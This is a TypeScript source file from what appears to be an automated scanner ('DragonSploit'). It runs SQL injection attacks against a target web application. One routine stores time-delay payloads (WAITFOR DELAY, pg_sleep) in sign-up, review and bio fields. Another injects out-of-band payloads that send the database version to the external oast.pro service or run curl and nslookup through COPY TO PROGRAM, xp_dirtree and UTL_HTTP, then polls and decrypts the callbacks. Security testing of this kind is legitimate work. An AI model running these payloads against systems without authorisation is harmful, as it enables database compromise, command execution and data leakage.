// file: vector-attacks.ts
import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import axios from 'axios';
import { executeRequest, delay, recordVulnerability, COMMON_FALLBACK_PARAMS } from './common';
import { URL } from 'url';
import { v4 as uuidv4 } from 'uuid';
import * as crypto from 'crypto';

/**
 * Second-Order (time-based) attack vector
 */
export async function executeSecondOrderAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
  const { targetUrl, scanId } = job.data;
  console.log('[Vector 4] Starting Second-Order Attack...');
  let found = false;

  const TIME_DELAY_THRESHOLD = 4000; // ms

  const attackVectors = [
    {
      name: "Username to Profile Page",
      injectionPoint: { path: "/api/register", method: "POST", payloadField: "username" },
      triggerPoint: { path: "/api/profile/{userId}", method: "GET" }
    },
    {
      name: "Product Review to Product Page",
      injectionPoint: { path: "/api/products/{productId}/reviews", method: "POST", payloadField: "comment" },
      triggerPoint: { path: "/api/products/{productId}", method: "GET" }
    },
    {
      name: "User Bio to Profile Page",
      injectionPoint: { path: "/api/profile/update", method: "POST", payloadField: "bio" },
      triggerPoint: { path: "/api/profile/{userId}", method: "GET" }
    }
  ];

  const timeBombPayloads = {
    MySQL: (field: string) => `${field}_value'; WAITFOR DELAY '0:0:5' --`,
    PostgreSQL: (field: string) => `${field}_value'; SELECT pg_sleep(5); --`,
    SQLite: (field: string) => {
      const unionSelect = Array(1000).fill(0).map((_, i) => `SELECT ${i + 1}`).join(' UNION ALL ');
      return `${field}_value' AND (SELECT COUNT(*) FROM (${unionSelect})) > 0 --`;
    }
  };

  for (const vector of attackVectors) {
    console.log(`[Vector 4] Testing Vector: ${vector.name}`);

    for (const [dbType, payloadFn] of Object.entries(timeBombPayloads)) {
      console.log(`[Vector 4] Testing Database Type: ${dbType}`);

      // Build injection path BEFORE creating URL (avoid reassigning const)
      let injectionPath = vector.injectionPoint.path;
      let productId: string | null = null;
      if (injectionPath.includes("{productId}")) {
        productId = "1"; // adjust logic to pick real product when available
        injectionPath = injectionPath.replace("{productId}", productId);
      }

      const injectionUrl = new URL(injectionPath, targetUrl).toString();
      const payloadValue = (payloadFn as (f: string) => string)(vector.injectionPoint.payloadField);
      const injectionPayload = { [vector.injectionPoint.payloadField]: payloadValue };

      let userId: string | null = null;
      try {
        // If registration insertion required, register clean first
        if (vector.injectionPoint.path.includes("/api/register")) {
          const cleanPayload = {
            [vector.injectionPoint.payloadField]: `clean_${Math.random().toString(36).substring(2, 8)}`,
            password: "test123"
          };
          const cleanResponse = await axios.post(injectionUrl, cleanPayload, { headers: { 'User-Agent': 'DragonSploit/2.0' } });
          if (cleanResponse.status !== 200 && cleanResponse.status !== 201) {
            console.log(`[Vector 4] Clean registration failed for ${vector.name}`);
            continue;
          }
          userId = (cleanResponse.data && cleanResponse.data.userId) ? String(cleanResponse.data.userId) : "1";
        }

        // Inject the malicious payload
        const injectionResponse = await axios.post(injectionUrl, injectionPayload, { headers: { 'User-Agent': 'DragonSploit/2.0' } });
        if (injectionResponse.status !== 200 && injectionResponse.status !== 201) {
          console.log(`[Vector 4] Injection failed for ${vector.name}, DB: ${dbType}`);
          continue;
        }
        console.log(`[Vector 4] Injected payload for ${vector.name}, DB: ${dbType}`);

        // Ensure commit/visibility
        await delay(1000);

        // Build trigger URL (replace placeholders before constructing URL)
        let triggerPath = vector.triggerPoint.path;
        if (triggerPath.includes("{userId}")) {
          if (!userId) {
            console.log(`[Vector 4] No userId available for ${vector.name}`);
            continue;
          }
          triggerPath = triggerPath.replace("{userId}", userId);
        }
        if (triggerPath.includes("{productId}")) {
          if (!productId) {
            console.log(`[Vector 4] No productId available for ${vector.name}`);
            continue;
          }
          triggerPath = triggerPath.replace("{productId}", productId);
        }

        const triggerUrl = new URL(triggerPath, targetUrl).toString();

        // Baseline measurement (clean)
        const cleanTriggerPath = vector.triggerPoint.path
          .replace("{userId}", userId || "1")
          .replace("{productId}", productId || "1");
        const cleanTriggerUrl = new URL(cleanTriggerPath, targetUrl).toString();
        const baselineStart = Date.now();
        await executeRequest(cleanTriggerUrl);
        const baselineTime = Date.now() - baselineStart;
        console.log(`[Vector 4] Baseline response time for ${vector.name}: ${baselineTime}ms`);

        // Trigger the tainted data
        const triggerStart = Date.now();
        await executeRequest(triggerUrl);
        const triggerTime = Date.now() - triggerStart;
        console.log(`[Vector 4] Trigger response time for ${vector.name}: ${triggerTime}ms`);

        if (triggerTime > baselineTime + TIME_DELAY_THRESHOLD) {
          console.log(`[Vector 4] Second-Order SQLi Confirmed for ${vector.name}, DB: ${dbType}`);
          const proof = `Payload: ${payloadValue}\nInjection Path: ${injectionUrl}\nTrigger Path: ${triggerUrl}\nBaseline Time: ${baselineTime}ms\nDelayed Time: ${triggerTime}ms`;
          const description = `Second-Order SQLi confirmed via the '${vector.name}' vector. A payload stored in the '${vector.injectionPoint.payloadField}' field at '${injectionUrl}' was triggered when accessing '${triggerUrl}', causing a measurable execution delay.`;
          await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.HIGH, description, proof);
          found = true;
          break;
        }
      } catch (err: unknown) {
        // safe error handling (axios or generic)
        if (axios.isAxiosError(err)) {
          console.log(`[Vector 4] Error during ${vector.name}, DB: ${dbType}: ${err.message}`);
        } else if (err instanceof Error) {
          console.log(`[Vector 4] Error during ${vector.name}, DB: ${dbType}: ${err.message}`);
        } else {
          console.log(`[Vector 4] Error during ${vector.name}, DB: ${dbType}: ${String(err)}`);
        }
      }
    }

    if (found) break;
  }

  return found;
}

/**
 * Out-of-band (OOB) interaction attack vector
 */
export async function executeOutOfBandAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
  const { targetUrl, scanId } = job.data;
  console.log('[Vector 3] Starting Out-of-Band Attack...');
  let found = false;

  const interactshServer = 'oast.pro';

  const oobPayloads: { [key: string]: string } = {
    MSSQL_DNS: `; EXEC master..xp_dirtree '\\\\${'{uniqueDomain}'}\\a';--`,
    MySQL_DNS_Windows: ` AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.${'{uniqueDomain}'}\\\\a')))`,
    PostgreSQL_HTTP: `'; COPY (SELECT '') TO PROGRAM 'curl http://${'{uniqueDomain}'}';--`,
    PostgreSQL_DNS: `'; COPY (SELECT '' ) TO PROGRAM 'nslookup ${'{uniqueDomain}'}';--`,
    Oracle_HTTP: `'||UTL_HTTP.REQUEST('http://${'{uniqueDomain}'}' )||'`,
    Oracle_DNS: `'||UTL_INADDR.GET_HOST_ADDRESS('${'{uniqueDomain}'}')||'`,
  };

  for (const param of COMMON_FALLBACK_PARAMS) {
    console.log(`[Vector 3] Testing Parameter: [${param}]`);

    for (const [payloadType, payloadTemplate] of Object.entries(oobPayloads)) {
      // Generate RSA key pair
      const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
        modulusLength: 1024,
        publicKeyEncoding: { type: 'pkcs1', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
      });

      const encodedPublicKey = Buffer.from(publicKey).toString('base64');

      // Correlation ID / secret
      let uuid = uuidv4().replace(/-/g, '');
      uuid = uuid.padEnd(33, 'a'); // pad to 33 chars
      let guid = '';
      for (const char of uuid) {
        if (/[0-9]/.test(char)) {
          guid += char;
        } else {
          const offset = Math.floor(Math.random() * 21);
          guid += String.fromCharCode(char.charCodeAt(0) + offset);
        }
      }
      const correlationId = guid.substring(0, 20);
      const secret = uuidv4();
      const uniqueDomain = `${guid}.${interactshServer}`;

      // Register with interactsh server
      let registered = false;
      try {
        const response = await axios.post(`https://${interactshServer}/register`, {
          'public-key': encodedPublicKey,
          'secret-key': secret,
          'correlation-id': correlationId,
        });
        if (response.data && response.data.message && response.data.message.includes('registration successful')) {
          registered = true;
        }
      } catch (err: unknown) {
        if (axios.isAxiosError(err)) {
          console.log(`[Vector 3] Registration error for ${payloadType}: ${err.message}`);
        } else if (err instanceof Error) {
          console.log(`[Vector 3] Registration error for ${payloadType}: ${err.message}`);
        } else {
          console.log(`[Vector 3] Registration error for ${payloadType}: ${String(err)}`);
        }
        continue;
      }

      if (!registered) continue;

      // Craft OOB payload and inject
      const oobPayload = payloadTemplate.replace('{uniqueDomain}', uniqueDomain);
      const testUrl = new URL(targetUrl);
      testUrl.searchParams.set(param, oobPayload);

      try {
        await executeRequest(testUrl.toString());
      } catch {
        // ignore network errors from triggering request
      }

      // wait and poll
      await delay(8000);

      try {
        const pollResponse = await axios.get(`https://${interactshServer}/poll?id=${correlationId}&secret=${secret}`);
        const pollData = pollResponse.data;

        let interactions: any[] = [];
        if (pollData && pollData.aes_key && pollData.data && pollData.data.length > 0) {
          // decrypt AES key
          const aesEncrypted = Buffer.from(pollData.aes_key, 'base64');
          const aesPlainKey = crypto.privateDecrypt({
            key: privateKey,
            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
            oaepHash: 'sha256',
          }, aesEncrypted);

          // decrypt data entries
          for (const encryptedData of pollData.data) {
            const decode = Buffer.from(encryptedData, 'base64');
            const iv = decode.slice(0, 16);
            const decipher = crypto.createDecipheriv('aes-256-cfb', aesPlainKey, iv);
            let plainBuffer = decipher.update(decode);
            plainBuffer = Buffer.concat([plainBuffer, decipher.final()]);
            const plainText = plainBuffer.slice(16).toString('utf8');
            interactions.push(JSON.parse(plainText));
          }
        }

        if (interactions.length > 0) {
          console.log(`[Vector 3] OOB Interaction Detected for ${payloadType}.`);
          const proof = `Payload Type: ${payloadType}\nUnique Domain: ${uniqueDomain}\nInteraction Data: ${JSON.stringify(interactions[0])}`;
          const description = `Out-of-Band (OOB) SQLi confirmed in parameter '${param}'. The server was forced to perform a DNS/HTTP request to a controlled external domain.`;
          await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
          found = true;
          break;
        }
      } catch (err: unknown) {
        if (axios.isAxiosError(err)) {
          console.log(`[Vector 3] Polling error for ${payloadType}: ${err.message}`);
        } else if (err instanceof Error) {
          console.log(`[Vector 3] Polling error for ${payloadType}: ${err.message}`);
        } else {
          console.log(`[Vector 3] Polling error for ${payloadType}: ${String(err)}`);
        }
      }
    }

    if (found) break;
  }

  return found;
}
